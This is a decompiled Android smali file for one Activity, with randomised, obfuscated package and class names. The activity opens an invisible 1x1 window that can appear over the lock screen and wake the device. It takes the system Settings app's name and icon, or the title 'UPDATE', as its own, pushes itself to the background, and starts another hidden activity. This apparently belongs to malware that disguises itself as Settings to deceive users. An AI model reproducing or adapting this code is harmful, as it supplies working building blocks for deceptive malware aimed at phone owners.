.class public Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;
.super Landroid/app/Activity;
.source "flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ.java"


# static fields
.field private static instance:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;

.field static x:Landroid/content/Context;


# instance fields
.field private count:I


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 28
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    const/4 v0, 0x0

    .line 34
    iput v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;->count:I

    return-void
.end method

.method public static drawableToBitmap(Landroid/graphics/drawable/Drawable;)Landroid/graphics/Bitmap;
    .locals 5

    .line 236
    instance-of v0, p0, Landroid/graphics/drawable/BitmapDrawable;

    if-eqz v0, :cond_0

    .line 237
    check-cast p0, Landroid/graphics/drawable/BitmapDrawable;

    invoke-virtual {p0}, Landroid/graphics/drawable/BitmapDrawable;->getBitmap()Landroid/graphics/Bitmap;

    move-result-object p0

    return-object p0

    .line 240
    :cond_0
    invoke-virtual {p0}, Landroid/graphics/drawable/Drawable;->getIntrinsicWidth()I

    move-result v0

    .line 241
    invoke-virtual {p0}, Landroid/graphics/drawable/Drawable;->getIntrinsicHeight()I

    move-result v1

    .line 243
    sget-object v2, Landroid/graphics/Bitmap$Config;->ARGB_8888:Landroid/graphics/Bitmap$Config;

    invoke-static {v0, v1, v2}, Landroid/graphics/Bitmap;->createBitmap(IILandroid/graphics/Bitmap$Config;)Landroid/graphics/Bitmap;

    move-result-object v0

    .line 244
    new-instance v1, Landroid/graphics/Canvas;

    invoke-direct {v1, v0}, Landroid/graphics/Canvas;-><init>(Landroid/graphics/Bitmap;)V

    .line 245
    invoke-virtual {v1}, Landroid/graphics/Canvas;->getWidth()I

    move-result v2

    invoke-virtual {v1}, Landroid/graphics/Canvas;->getHeight()I

    move-result v3

    const/4 v4, 0x0

    invoke-virtual {p0, v4, v4, v2, v3}, Landroid/graphics/drawable/Drawable;->setBounds(IIII)V

    .line 246
    invoke-virtual {p0, v1}, Landroid/graphics/drawable/Drawable;->draw(Landroid/graphics/Canvas;)V

    return-object v0
.end method

.method public static isActivityOpen()Z
    .locals 1

    .line 31
    sget-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;->instance:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;

    if-eqz v0, :cond_0

    const/4 v0, 0x1

    goto :goto_0

    :cond_0
    const/4 v0, 0x0

    :goto_0
    return v0
.end method

.method private setIcon(Landroid/content/Context;Landroid/graphics/Bitmap;)V
    .locals 1

    .line 92
    :try_start_0
    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v0, 0x15

    if-lt p1, v0, :cond_0

    .line 93
    new-instance p1, Landroid/app/ActivityManager$TaskDescription;

    const/4 v0, 0x0

    invoke-direct {p1, v0, p2}, Landroid/app/ActivityManager$TaskDescription;-><init>(Ljava/lang/String;Landroid/graphics/Bitmap;)V

    .line 94
    invoke-virtual {p0, p1}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;->setTaskDescription(Landroid/app/ActivityManager$TaskDescription;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    .line 97
    invoke-virtual {p1}, Ljava/lang/Exception;->printStackTrace()V

    :cond_0
    :goto_0
    return-void
.end method


# virtual methods
.method public finish()V
    .locals 1

    const/4 v0, 0x0

    .line 71
    sput-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;->instance:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;

    .line 72
    invoke-super {p0}, Landroid/app/Activity;->finish()V

    return-void
.end method

.method public onAttachedToWindow()V
    .locals 2

    .line 76
    invoke-super {p0}, Landroid/app/Activity;->onAttachedToWindow()V

    .line 78
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;->getWindow()Landroid/view/Window;

    move-result-object v0

    const/4 v1, 0x1

    invoke-virtual {v0, v1, v1}, Landroid/view/Window;->setLayout(II)V

    return-void
.end method

.method public onBackPressed()V
    .locals 0

    .line 254
    invoke-super {p0}, Landroid/app/Activity;->onBackPressed()V

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 3

    .line 103
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 106
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;->getWindow()Landroid/view/Window;

    move-result-object p1

    const/high16 v0, 0x80000

    .line 107
    invoke-virtual {p1, v0}, Landroid/view/Window;->addFlags(I)V

    const v0, 0x200081

    .line 108
    invoke-virtual {p1, v0}, Landroid/view/Window;->addFlags(I)V

    .line 120
    :try_start_0
    sput-object p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;->instance:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;

    .line 122
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;->setWindowParams()V

    .line 123
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;->getWindow()Landroid/view/Window;

    move-result-object p1

    const/4 v0, 0x1

    invoke-virtual {p1, v0, v0}, Landroid/view/Window;->setLayout(II)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    const-string p1, "com.android.settings"

    const/4 v0, 0x0

    .line 131
    :try_start_1
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    .line 132
    invoke-virtual {v1, p1, v0}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v2

    .line 133
    invoke-virtual {v1, v2}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    move-result-object v1

    invoke-interface {v1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v1

    .line 134
    invoke-virtual {p0, v1}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;->setTitle(Ljava/lang/CharSequence;)V
    :try_end_1
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_0

    :catch_1
    move-exception v1

    .line 138
    invoke-virtual {v1}, Landroid/content/pm/PackageManager$NameNotFoundException;->printStackTrace()V

    const-string v1, "UPDATE"

    .line 139
    invoke-virtual {p0, v1}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;->setTitle(Ljava/lang/CharSequence;)V

    .line 144
    :goto_0
    :try_start_2
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    .line 145
    invoke-virtual {v1, p1, v0}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object p1

    .line 146
    invoke-virtual {v1, p1}, Landroid/content/pm/PackageManager;->getApplicationIcon(Landroid/content/pm/ApplicationInfo;)Landroid/graphics/drawable/Drawable;

    move-result-object p1

    .line 149
    invoke-static {p1}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;->drawableToBitmap(Landroid/graphics/drawable/Drawable;)Landroid/graphics/Bitmap;

    move-result-object p1

    .line 150
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-direct {p0, v0, p1}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;->setIcon(Landroid/content/Context;Landroid/graphics/Bitmap;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    goto :goto_1

    :catch_2
    move-exception p1

    .line 154
    invoke-virtual {p1}, Ljava/lang/Exception;->printStackTrace()V

    .line 158
    :goto_1
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    sput-object p1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;->x:Landroid/content/Context;

    .line 160
    new-instance p1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ$1;

    invoke-direct {p1, p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ$1;-><init>(Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;)V

    .line 223
    new-instance v0, Ljava/lang/Thread;

    invoke-direct {v0, p1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 225
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method protected onDestroy()V
    .locals 1

    const/4 v0, 0x0

    .line 64
    sput-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;->instance:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;

    .line 65
    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    return-void
.end method

.method protected onResume()V
    .locals 3

    .line 38
    invoke-super {p0}, Landroid/app/Activity;->onResume()V

    const/4 v0, 0x1

    .line 41
    invoke-virtual {p0, v0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;->moveTaskToBack(Z)Z

    .line 43
    iget v1, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;->count:I

    const/4 v2, 0x2

    if-ge v1, v2, :cond_0

    add-int/2addr v1, v0

    .line 44
    iput v1, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;->count:I

    return-void

    :cond_0
    const/4 v0, 0x0

    .line 48
    iput v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;->count:I

    .line 50
    new-instance v0, Landroid/content/Intent;

    sget-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71;->appContext:Landroid/content/Context;

    const-class v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/opendnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9activity;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v1, 0x10000000

    .line 51
    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v1, 0x800000

    .line 52
    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const-string v1, "key"

    const-string v2, "com.android.settings"

    .line 53
    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 55
    invoke-virtual {p0, v0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;->startActivity(Landroid/content/Intent;)V

    return-void
.end method

.method public setWindowParams()V
    .locals 2

    .line 82
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;->getWindow()Landroid/view/Window;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/Window;->getAttributes()Landroid/view/WindowManager$LayoutParams;

    move-result-object v0

    const/4 v1, 0x0

    .line 83
    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->dimAmount:F

    const/16 v1, 0x220

    .line 84
    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->flags:I

    .line 86
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;->getWindow()Landroid/view/Window;

    move-result-object v1

    invoke-virtual {v1, v0}, Landroid/view/Window;->setAttributes(Landroid/view/WindowManager$LayoutParams;)V

    return-void
.end method
